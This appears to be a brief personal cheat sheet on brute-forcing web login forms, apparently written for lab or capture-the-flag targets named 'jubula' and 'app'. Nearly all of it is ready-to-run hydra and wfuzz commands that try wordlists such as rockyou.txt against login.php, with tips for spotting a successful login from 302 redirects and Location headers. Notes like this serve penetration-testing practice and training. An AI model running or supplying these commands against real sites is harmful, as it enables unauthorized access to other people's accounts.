# Password brute force

```bash
sudo hydra -L  users.txt -P rockyou.txt jubula http-post-form "/login.php:username=^USER^&password=^PASS^:S=302" -o result.txt
```

```bash
sudo hydra -L  users_jubula.txt -P rockyou.txt jubula http-post-form "/login.php:username=^USER^&password=^PASS^:F=Incorrect Login Information" -o result.txt
```

```bash
systemd-run --scope -p MemoryLimit=8G   wfuzz -w rockyou.txt -d "username=robert&password=FUZZ&submit=" --hh 5431  http://jubula/login.php
```

```bash
wfuzz -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt -d "username=admin&password=FUZZ" --hc 404  http://app/login
```

## If the site returns 302 

### If  the site returns authentication result in header.Location

Example: 
```
Location: /login?message=Authentication%20failed
```

We need exclude result where response has Authentication failed in Location header.
We exclude all results where r.headers.response.location contains  text "failed"
```bash
wfuzz -w  /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt -d "username=admin&password=FUZZ" --filter "r.headers.response.location\!~'failed'" http://app/login
```


## References
1. https://wfuzz.readthedocs.io/en/latest/user/advanced.html